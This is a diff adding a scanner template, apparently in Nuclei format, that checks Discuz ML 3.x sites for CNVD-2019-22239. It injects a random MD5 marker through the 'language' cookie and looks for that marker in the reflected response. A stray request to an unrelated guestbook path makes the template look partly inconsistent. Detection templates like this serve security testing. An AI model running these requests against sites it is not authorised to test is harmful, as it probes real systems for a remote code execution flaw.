@@ -1,0 +1,45 @@
+id: poc-local-cms-xray-discuz-ml3x-cnvd-2019-22239
+
+info:
+  name: poc-local-cms-xray-discuz-ml3x-cnvd-2019-22239
+  author: capiton
+  severity: high
+  reference:
+    - https://www.cnvd.org.cn/flaw/show/CNVD-2019-22239
+  tags: discuz
+
+
+variables:
+  r1: "{{rand_int(800000000, 1000000000)}}"
+  md5_r1: "{{md5(r1)}}"
+
+requests:
+  - raw:
+      - |
+        GET /forum.php HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /forum.php HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: {{token}}language=sc{{md5_r1}}
+
+      - |
+        GET /plus/guestbook.php HTTP/1.1
+        Host: {{Hostname}}
+    
+    extractors:
+      - type: regex 
+        part: body  # part of the response (header,body,all)
+        group: 1   
+        internal: true
+        name: token
+        regex:
+          - "cookiepre = ''(.*?[\\w_]+)''"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        condition: and
+        words:
+          - "{{md5_r1}}"
